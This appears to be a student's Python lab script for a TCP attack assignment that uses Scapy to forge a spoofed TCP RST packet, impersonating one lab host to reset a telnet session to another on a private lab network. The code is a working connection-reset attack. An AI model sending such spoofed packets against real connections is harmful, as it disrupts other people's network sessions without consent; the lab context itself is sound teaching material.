#!/usr/bin/env python3

# Launching the attack manually

from scapy.all import *

print("CMPE209-Assignment1-016707314-TCPAttack Lab-Task2.1-Launching the RST attack manually");

ip = IP(src="10.9.0.6", dst="10.9.0.5") # impersonate the user
tcp = TCP(sport=40902, dport=23, flags="R", seq=906166479)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-62f4ebf4c30a", verbose=0)
